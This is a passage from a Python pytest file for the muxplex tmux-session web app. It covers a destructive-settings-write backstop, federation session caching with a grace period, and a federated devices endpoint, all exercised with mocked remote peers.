            "views": [{"name": "V", "sessions": pinned, "match_names": ["amplifier-*"]}]
        },
    )

    remaining = pinned[:]
    for _ in range(19):  # down to the last pin, not through it -- see note above
        remaining = remaining[1:]
        response = client.patch(
            "/api/settings",
            json={
                "views": [
                    {"name": "V", "sessions": remaining, "match_names": ["amplifier-*"]}
                ]
            },
        )
        assert response.status_code == 200, response.json()

    assert client.get("/api/settings").json()["views"][0]["sessions"] == remaining
    assert len(remaining) == 1


def test_patch_settings_last_member_removal_can_trip_backstop_even_incrementally(
    client, tmp_path, monkeypatch
):
    """DOCUMENTED FINDING (surfaced, not worked around, per this task's
    explicit instruction): DESTRUCTIVE_MEMBER_DROP_RATIO has no absolute-
    count floor -- unlike DESTRUCTIVE_VIEW_COLLAPSE_THRESHOLD, which
    guards small numbers explicitly. Removing a view's LAST session pin
    when exactly one match_names pattern also remains (2 total members ->
    1) is EXACTLY a 50% drop and trips the backstop -- even though it is a
    single, incremental, one-checkbox-at-a-time removal, identical in kind
    to the 19 harmless ones before it in the test above. This is pre-
    existing `assess_views_destruction` arithmetic (views.py), unrelated
    to and not introduced by the rule editor -- the editor cannot avoid it
    because it never touches `sessions` at all, but the EXISTING Manage
    View checkbox (unchanged by this task) can hit this 409 on the last
    pin of any view that also carries exactly one rule. Not fixed here;
    flagged for the owner to decide whether the ratio needs an absolute
    floor the way the collapse check already has one.
    """
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    client.patch(
        "/api/settings",
        json={
            "views": [
                {"name": "V", "sessions": ["dev1:last"], "match_names": ["amplifier-*"]}
            ]
        },
    )

    response = client.patch(
        "/api/settings",
        json={"views": [{"name": "V", "sessions": [], "match_names": ["amplifier-*"]}]},
    )

    assert response.status_code == 409
    body = response.json()
    assert body["backstop"] is True
    assert body["counts"]["before_members"] == 2
    assert body["counts"]["after_members"] == 1

    # The legitimate escape hatch (a local operator confirming intent) still works.
    forced = client.patch(
        "/api/settings",
        json={
            "views": [{"name": "V", "sessions": [], "match_names": ["amplifier-*"]}],
            "allow_destructive": True,
        },
    )
    assert forced.status_code == 200


def test_patch_settings_bulk_pattern_shrink_on_dominant_view_still_trips_backstop(
    client, tmp_path, monkeypatch
):
    """Documents the boundary this task asked to verify, rather than paper
    over: a ONE-SHOT rewrite that drops most of a *dominant* view's
    match_names (patterns count as members -- views.py's
    _view_member_count) is -- correctly -- still caught by the backstop.
    The rule editor never performs this shape of write (it only ever adds
    to match_names via Save, one view at a time, alongside its own
    unchanged `sessions`), so this is a documented, expected 409, not a
    defect the editor needs to work around."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    many_patterns = [f"team-{i}-*" for i in range(20)]
    client.patch(
        "/api/settings",
        json={"views": [{"name": "V", "sessions": [], "match_names": many_patterns}]},
    )

    response = client.patch(
        "/api/settings",
        json={"views": [{"name": "V", "sessions": [], "match_names": ["team-0-*"]}]},
    )

    assert response.status_code == 409
    assert response.json()["backstop"] is True


def test_patch_settings_backstop_response_includes_current_timestamp(
    client, tmp_path, monkeypatch
):
    """A backstop 409's settings_updated_at reflects the server's actual (unwritten) value."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    client.patch("/api/settings", json={"views": _views(8)})
    real_ts = client.get("/api/settings").json()["settings_updated_at"]

    response = client.patch("/api/settings", json={"views": [_views(8)[0]]})

    assert response.status_code == 409
    assert response.json()["settings_updated_at"] == real_ts


# ---------------------------------------------------------------------------
# PUT /api/settings/sync -- destructive-write backstop + views_updated_at
# ---------------------------------------------------------------------------


def test_put_settings_sync_rejects_destructive_views_collapse(
    client, tmp_path, monkeypatch
):
    """A sync payload with an 8->1 views collapse is rejected with 409/backstop, no write."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "views": _views(8),
                "settings_updated_at": 100.0,
                "views_updated_at": 100.0,
            }
        )
    )

    response = client.put(
        "/api/settings/sync",
        json={
            "settings": {"views": [_views(8)[0]]},
            "settings_updated_at": 200.0,
            "views_updated_at": 300.0,
        },
    )

    assert response.status_code == 409
    body = response.json()
    assert body["backstop"] is True
    assert body["counts"]["before_views"] == 8
    assert body["counts"]["after_views"] == 1

    reloaded = settings_mod.load_settings()
    assert len(reloaded["views"]) == 8
    assert reloaded["settings_updated_at"] == 100.0, (
        "no write must have happened at all"
    )


def test_put_settings_sync_legacy_peer_without_views_updated_at_interoperates(
    client, tmp_path, monkeypatch
):
    """A sync payload omitting views_updated_at (legacy peer) still applies normally."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"settings_updated_at": 100.0}))

    response = client.put(
        "/api/settings/sync",
        json={
            "settings": {"views": [{"name": "Work", "sessions": ["a"]}]},
            "settings_updated_at": 200.0,
            # views_updated_at omitted entirely -- legacy peer.
        },
    )

    assert response.status_code == 200
    assert response.json()["settings"]["views"] == [{"name": "Work", "sessions": ["a"]}]


def test_get_settings_sync_includes_views_updated_at(client, tmp_path, monkeypatch):
    """GET /api/settings/sync response includes views_updated_at as a top-level field."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    settings_mod.save_settings({"views": [{"name": "A", "sessions": []}]})

    response = client.get("/api/settings/sync")

    assert response.status_code == 200
    body = response.json()
    assert "views_updated_at" in body
    assert "views_updated_at" not in body["settings"], (
        "views_updated_at is metadata, must not appear inside the nested settings dict"
    )


# ---------------------------------------------------------------------------
# fetch_remote: zero-session visibility and flapping grace period
# ---------------------------------------------------------------------------


def test_fetch_remote_returns_empty_status_for_zero_sessions(
    client, monkeypatch, tmp_path
):
    """When remote /api/sessions returns [], federation returns {status: 'empty'} entry.

    A device that is online but has zero tmux sessions must not vanish silently.
    Instead, the endpoint must include a {status: 'empty', deviceName: ...} entry
    so the frontend can render a 'No sessions' tile.

    Before implementation: fails because the list comprehension returns [] for empty
    session lists, and the empty list is flattened into nothing.
    """
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://empty-host:8088",
                        "key": "secret",
                        "name": "empty-host",
                    }
                ]
            }
        )
    )
    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    mock_resp = MagicMock(spec=httpx.Response)
    mock_resp.status_code = 200
    mock_resp.json.return_value = []
    mock_resp.raise_for_status.return_value = None

    async def mock_get(*args, **kwargs):
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()
    assert len(data) == 1, (
        f"Expected exactly one status entry for empty remote, got {len(data)} entries: {data}"
    )
    assert data[0].get("status") == "empty", (
        f"Expected status='empty' for zero-session remote, got: {data[0].get('status')!r}"
    )
    assert data[0].get("deviceName") == "empty-host", (
        f"Expected deviceName='empty-host', got: {data[0].get('deviceName')!r}"
    )


def test_fetch_remote_uses_cache_on_transient_failure(client, monkeypatch, tmp_path):
    """When remote fails after a prior success, cached sessions are returned (grace period).

    A single failed HTTP request must not immediately evict the device from the UI.
    The server keeps the last-known-good result and returns it for up to
    _FEDERATION_GRACE_FAILURES consecutive failures.

    Before implementation: fails because fetch_remote has no cache — transient failure
    immediately returns {status: 'unreachable'}.
    """
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.main as main_mod
    import muxplex.settings as settings_mod

    # Reset module-level cache so this test starts clean
    monkeypatch.setattr(main_mod, "_federation_cache", {})

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {"url": "http://remote:8088", "key": "k", "name": "cache-host"}
                ]
            }
        )
    )
    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    call_count = [0]

    async def mock_get_stateful(*args, **kwargs):
        call_count[0] += 1
        if call_count[0] == 1:
            mock_resp = MagicMock(spec=httpx.Response)
            mock_resp.status_code = 200
            mock_resp.json.return_value = [{"name": "sess1"}, {"name": "sess2"}]
            mock_resp.raise_for_status.return_value = None
            return mock_resp
        raise httpx.TimeoutException("timeout", request=MagicMock())

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get_stateful
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    # First call: succeeds and populates cache
    r1 = client.get("/api/federation/sessions")
    assert r1.status_code == 200
    d1 = [s for s in r1.json() if s.get("deviceName") == "cache-host"]
    assert len(d1) == 2, f"First call must return 2 sessions, got {d1}"

    # Second call: remote times out — cache should return the 2 cached sessions
    r2 = client.get("/api/federation/sessions")
    assert r2.status_code == 200
    d2 = [s for s in r2.json() if s.get("deviceName") == "cache-host"]
    assert len(d2) == 2, f"Within grace period, must return 2 cached sessions, got {d2}"
    assert not any(s.get("status") == "unreachable" for s in d2), (
        "Within grace period, cached sessions must be returned, not 'unreachable'"
    )


def test_fetch_remote_marks_unreachable_after_grace_period(
    client, monkeypatch, tmp_path
):
    """After _FEDERATION_GRACE_FAILURES consecutive failures, device is marked unreachable.

    The grace period prevents flapping, but must not hide a genuinely offline device
    indefinitely. After 3 consecutive failures the next poll must return
    {status: 'unreachable'}.

    Before implementation: fails because there is no cache at all — unreachable is
    returned immediately on first failure.
    """
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.main as main_mod
    import muxplex.settings as settings_mod

    # Reset module-level cache so this test starts clean
    monkeypatch.setattr(main_mod, "_federation_cache", {})

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {"url": "http://remote:8088", "key": "k", "name": "grace-host"}
                ]
            }
        )
    )
    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    call_count = [0]

    async def mock_get_stateful(*args, **kwargs):
        call_count[0] += 1
        if call_count[0] == 1:
            mock_resp = MagicMock(spec=httpx.Response)
            mock_resp.status_code = 200
            mock_resp.json.return_value = [{"name": "sess1"}]
            mock_resp.raise_for_status.return_value = None
            return mock_resp
        raise httpx.TimeoutException("timeout", request=MagicMock())

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get_stateful
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    # Call 1: success — populates cache
    r = client.get("/api/federation/sessions")
    d = r.json()
    assert any(s.get("name") == "sess1" for s in d), "Call 1 must return sess1"

    # Calls 2-4 (failures 1-3): within grace period — must return cached sessions
    for i in range(3):
        r = client.get("/api/federation/sessions")
        d = r.json()
        host_entries = [s for s in d if s.get("deviceName") == "grace-host"]
        assert not any(s.get("status") == "unreachable" for s in host_entries), (
            f"Call {i + 2}: fail_count={i + 1} is within grace period — "
            f"must return cached sessions, not 'unreachable'. Got: {host_entries}"
        )

    # Call 5 (failure 4): exceeds grace period — must return unreachable
    r = client.get("/api/federation/sessions")
    d = r.json()
    host_entries = [s for s in d if s.get("deviceName") == "grace-host"]
    assert any(s.get("status") == "unreachable" for s in host_entries), (
        f"After exceeding grace period, device must be marked 'unreachable'. Got: {host_entries}"
    )


# ---------------------------------------------------------------------------
# Tests for _lookup_remote_by_device_id helper
# ---------------------------------------------------------------------------


def test_lookup_remote_by_device_id_found(tmp_path, monkeypatch):
    """_lookup_remote_by_device_id returns the remote dict matching the given device_id."""
    import json

    import muxplex.settings as settings_mod
    from muxplex.main import _lookup_remote_by_device_id

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://laptop:8088",
                        "key": "key-aaa",
                        "name": "Laptop",
                        "device_id": "aaa-111",
                    },
                    {
                        "url": "http://desktop:8088",
                        "key": "key-bbb",
                        "name": "Desktop",
                        "device_id": "bbb-222",
                    },
                ]
            }
        )
    )

    result = _lookup_remote_by_device_id("bbb-222")

    assert result is not None, "Expected a remote dict, got None"
    assert result.get("name") == "Desktop", (
        f"Expected 'Desktop' remote, got: {result!r}"
    )
    assert result.get("device_id") == "bbb-222", (
        f"Expected device_id 'bbb-222', got: {result.get('device_id')!r}"
    )


def test_lookup_remote_by_device_id_not_found(tmp_path, monkeypatch):
    """_lookup_remote_by_device_id returns None when no remote matches the given device_id."""
    import json

    import muxplex.settings as settings_mod
    from muxplex.main import _lookup_remote_by_device_id

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://laptop:8088",
                        "key": "key-aaa",
                        "name": "Laptop",
                        "device_id": "aaa-111",
                    },
                ]
            }
        )
    )

    result = _lookup_remote_by_device_id("zzz-999")

    assert result is None, (
        f"Expected None for unknown device_id 'zzz-999', got: {result!r}"
    )


# ---------------------------------------------------------------------------
# Task-9: Federation Proxy Endpoints — Switch to device_id Lookup
# ---------------------------------------------------------------------------


def test_federation_connect_by_device_id(client, monkeypatch, tmp_path):
    """POST /api/federation/{device_id}/connect/{session_name} works when device_id matches a remote.

    Configures a remote with device_id='aaa-111-bbb', POSTs to the new device_id-based
    URL, and verifies the endpoint proxies to the correct remote and returns 200.
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://laptop:8088",
                        "key": "key-aaa",
                        "name": "Laptop",
                        "device_id": "aaa-111-bbb",
                    }
                ],
            }
        )
    )

    post_calls = []

    async def mock_post(url, **kwargs):
        post_calls.append({"url": url, "kwargs": kwargs})
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "active_session": "my-session",
            "ttyd_port": 7682,
        }
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.post = mock_post
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.post("/api/federation/aaa-111-bbb/connect/my-session")
    assert response.status_code == 200, (
        f"Expected 200, got {response.status_code}: {response.text}"
    )
    data = response.json()
    assert data["active_session"] == "my-session"


# ---------------------------------------------------------------------------
# Task-10: Tag Sessions with device_id
# ---------------------------------------------------------------------------


def test_federation_sessions_tags_local_with_device_id(client, monkeypatch, tmp_path):
    """GET /api/federation/sessions: local sessions have deviceId and sessionKey from identity.

    The local device_id is loaded from the identity file and used to:
    - tag each local session with deviceId: local_device_id
    - build sessionKey: f'{local_device_id}:{name}'
    """
    import json

    import muxplex.identity as identity_mod
    import muxplex.settings as settings_mod

    # Redirect identity file to a known UUID
    identity_path = tmp_path / "identity.json"
    identity_path.write_text(json.dumps({"device_id": "local-uuid"}))
    monkeypatch.setattr(identity_mod, "IDENTITY_PATH", identity_path)

    # Set up settings with no remote instances
    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps({"device_name": "my-machine", "remote_instances": []})
    )

    # Mock local session list
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["dev"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"dev": ""})

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    local_sessions = [s for s in data if s.get("remoteId") is None]
    assert len(local_sessions) == 1, f"Expected 1 local session, got: {local_sessions}"

    local = local_sessions[0]
    assert local.get("deviceId") == "local-uuid", (
        f"Local session must have deviceId='local-uuid', got: {local.get('deviceId')!r}"
    )
    assert local.get("sessionKey") == "local-uuid:dev", (
        f"Local session must have sessionKey='local-uuid:dev', got: {local.get('sessionKey')!r}"
    )


def test_federation_sessions_tags_local_with_device_version(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/sessions: local sessions carry deviceVersion == app.version.

    This is what lets a client compare "this device" against federated peers
    using a single response, without a second /api/instance-info fetch.
    """
    import json

    import muxplex.main as main_mod
    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps({"device_name": "my-machine", "remote_instances": []})
    )

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["dev"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"dev": ""})

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    local_sessions = [s for s in data if s.get("remoteId") is None]
    assert len(local_sessions) == 1
    assert local_sessions[0].get("deviceVersion") == main_mod.app.version, (
        f"Local session deviceVersion must equal app.version, got: {local_sessions[0].get('deviceVersion')!r}"
    )


def test_federation_sessions_remote_sessions_have_device_version(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/sessions: remote sessions carry deviceVersion from the
    remote's own /api/instance-info, fetched alongside /api/sessions."""
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "device_name": "local-host",
                "remote_instances": [
                    {"url": "http://spark-2:8088", "key": "abc123", "name": "spark-2"}
                ],
            }
        )
    )

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    async def mock_get(url, **kwargs):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = lambda: None
        if url.endswith("/api/instance-info"):
            mock_resp.json = lambda: {
                "name": "spark-2",
                "device_id": "spark-2-uuid",
                "version": "0.16.0",
                "federation_enabled": True,
            }
        else:
            mock_resp.json = lambda: [{"name": "work", "snapshot": "", "bell": {}}]
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    remote_sessions = [s for s in data if s.get("remoteId") is not None and "name" in s]
    assert len(remote_sessions) == 1
    assert remote_sessions[0].get("deviceVersion") == "0.16.0", (
        f"Remote session deviceVersion must be '0.16.0', got: {remote_sessions[0].get('deviceVersion')!r}"
    )


def test_federation_sessions_device_version_unknown_when_remote_lacks_it(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/sessions: when the remote's /api/instance-info fails or
    is too old to serve version, deviceVersion must be None -- never defaulted to
    a real-looking version string that could be mistaken for agreement."""
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "device_name": "local-host",
                "remote_instances": [
                    {
                        "url": "http://spark-old:8088",
                        "key": "abc123",
                        "name": "spark-old",
                    }
                ],
            }
        )
    )

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    async def mock_get(url, **kwargs):
        if url.endswith("/api/instance-info"):
            raise httpx.ConnectError("connection refused")
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = lambda: None
        mock_resp.json = lambda: [{"name": "work", "snapshot": "", "bell": {}}]
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    remote_sessions = [s for s in data if s.get("remoteId") is not None and "name" in s]
    assert len(remote_sessions) == 1
    assert remote_sessions[0].get("deviceVersion") is None, (
        f"deviceVersion must be None when the remote's instance-info is unreachable, "
        f"got: {remote_sessions[0].get('deviceVersion')!r}"
    )


# ---------------------------------------------------------------------------
# GET /api/federation/devices (Step 6, design doc §8.1 #11)
# ---------------------------------------------------------------------------


def test_federation_devices_empty_when_no_remote_instances(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/devices returns [] (not an error) when remote_instances

    is absent/empty -- a non-federated server behaves exactly as today.
    """
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"remote_instances": []}))

    response = client.get("/api/federation/devices")
    assert response.status_code == 200
    assert response.json() == []


def test_federation_devices_absent_remote_instances_key(client, monkeypatch, tmp_path):
    """Same as above, but remote_instances is entirely absent from settings.json

    (not merely an empty list) -- settings.get() default must also yield [].
    """
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"device_name": "local-host"}))

    response = client.get("/api/federation/devices")
    assert response.status_code == 200
    assert response.json() == []


def test_federation_devices_returns_projection_for_one_peer(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/devices returns a filtered projection per device:

    device_id, display_name, last_heartbeat_at, sync_group, homeDeviceId,
    homeDeviceName -- and NEVER the full device record (no controlled_by,
    no view_mode, no viewing_session, no kind).
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "device_name": "local-host",
                "remote_instances": [
                    {
                        "url": "http://alienware:8088",
                        "key": "abc123",
                        "name": "alienware",
                        "device_id": "peer-alienware",
                    }
                ],
            }
        )
    )

    async def mock_get(url, **kwargs):
        assert url == "http://alienware:8088/api/state"
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = lambda: None
        mock_resp.json = lambda: {
            "devices": {
                "d-deck-alien": {
                    "label": "Stream Deck",
                    "display_name": None,
                    "kind": "deck",  # a peer MIGHT send this; must be filtered out
                    "view_mode": "grid",
                    "viewing_session": "work",
                    "controlled_by": None,
                    "sync_group": "global",
                    "last_heartbeat_at": 1234567890.0,
                }
            }
        }
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/devices")
    assert response.status_code == 200
    data = response.json()

    assert len(data) == 1, f"Expected 1 device entry, got: {data}"
    entry = data[0]
    assert entry["device_id"] == "d-deck-alien"
    assert entry["display_name"] == "Stream Deck", (
        "must fall back to label when display_name is None"
    )
    assert entry["last_heartbeat_at"] == 1234567890.0
    assert entry["sync_group"] == "global"
    assert entry["homeDeviceId"] == "peer-alienware"
    assert entry["homeDeviceName"] == "alienware"
    assert "status" not in entry

    # Never the full device record.
    for leaked_field in (
        "kind",
        "view_mode",
        "viewing_session",
        "controlled_by",
        "label",
    ):
        assert leaked_field not in entry, (
            f"{leaked_field!r} must not leak into the federated devices projection, got: {entry}"
        )


def test_federation_devices_display_name_wins_over_label(client, monkeypatch, tmp_path):
    """When a peer device has BOTH label and display_name set, display_name

    (the human override) wins -- same precedence as app.js's deviceDisplayLabel.
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {"url": "http://alienware:8088", "key": "k", "name": "alienware"}
                ],
            }
        )
    )

    async def mock_get(url, **kwargs):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = lambda: None
        mock_resp.json = lambda: {
            "devices": {
                "d-1": {
                    "label": "Chrome on alienware",
                    "display_name": "My iPad",
                    "sync_group": "global",
                    "last_heartbeat_at": 1.0,
                }
            }
        }
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/devices")
    assert response.json()[0]["display_name"] == "My iPad"


def test_federation_devices_includes_unreachable_status(client, monkeypatch, tmp_path):
    """GET /api/federation/devices includes a status entry (not silence) when

    a peer cannot be reached -- same 'unreachable' vocabulary
    GET /api/federation/sessions already uses, tagged with homeDeviceId/
    homeDeviceName instead of deviceId/remoteId/deviceName.
    """
    import json

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://alienware-r13:8088",
                        "key": "k",
                        "name": "alienware-r13",
                    }
                ],
            }
        )
    )

    async def mock_get(url, **kwargs):
        raise httpx.ConnectError("refused")

    from unittest.mock import MagicMock

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/devices")
    assert response.status_code == 200
    data = response.json()
    assert len(data) == 1
    assert data[0]["status"] == "unreachable"
    assert data[0]["homeDeviceName"] == "alienware-r13"
    assert "device_id" not in data[0]


def test_federation_devices_includes_auth_failed_status(client, monkeypatch, tmp_path):
    """GET /api/federation/devices: a 401/403 from a peer yields status='auth_failed',

    not 'unreachable' and not a raised error.
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://spark-2:8088",
                        "key": "wrong-key",
                        "name": "spark-2",
                    }
                ],
            }
        )
    )

    async def mock_get(url, **kwargs):
        mock_resp = MagicMock()
        mock_resp.status_code = 401
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/devices")
    data = response.json()
    assert len(data) == 1
    assert data[0]["status"] == "auth_failed"
    assert data[0]["homeDeviceName"] == "spark-2"


def test_federation_devices_empty_peer_registry_shows_status(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/devices: a REACHABLE peer with zero registered devices

    gets a status='empty' entry, reusing the same vocabulary
    GET /api/federation/sessions uses for a device with zero sessions --
    never silently absent.
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {"url": "http://macbook:8088", "key": "k", "name": "macbook"}
                ],
            }
        )
    )

    async def mock_get(url, **kwargs):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = lambda: None
        mock_resp.json = lambda: {"devices": {}}
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/devices")
    data = response.json()
    assert len(data) == 1
    assert data[0]["status"] == "empty"
    assert data[0]["homeDeviceName"] == "macbook"


def test_federation_devices_multiple_peers_mixed_outcomes(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/devices with multiple peers: a reachable peer's

    devices and an unreachable peer's status entry both appear in the same
    response -- one peer's failure never suppresses another peer's data.
    """
    import json

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://spark-2:8088",
                        "key": "k1",
                        "name": "spark-2",
                        "device_id": "peer-spark-2",
                    },
                    {
                        "url": "http://spark-3:8088",
                        "key": "k2",
                        "name": "spark-3",
                        "device_id": "peer-spark-3",
                    },
                ],
            }
        )
    )

    from unittest.mock import MagicMock

    async def mock_get(url, **kwargs):
        if "spark-2" in url:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.raise_for_status = lambda: None
            mock_resp.json = lambda: {
                "devices": {
                    "d-x": {
                        "label": "Soft Deck",
                        "display_name": None,
                        "sync_group": "global",
                        "last_heartbeat_at": 2.0,
                    }
                }
            }
            return mock_resp
        raise httpx.ConnectError("refused")

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/devices")
    data = response.json()

    device_entries = [d for d in data if "device_id" in d]
    status_entries = [d for d in data if "status" in d]
    assert len(device_entries) == 1
    assert device_entries[0]["homeDeviceId"] == "peer-spark-2"
    assert len(status_entries) == 1
    assert status_entries[0]["status"] == "unreachable"
    assert status_entries[0]["homeDeviceId"] == "peer-spark-3"


def test_federation_devices_caches_across_transient_failures(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/devices: a transient failure after a successful poll

    returns the CACHED device list (not 'unreachable') until
    _FEDERATION_GRACE_FAILURES consecutive failures are reached -- same grace
    window GET /api/federation/sessions already proves.
    """
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.main as main_mod
    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
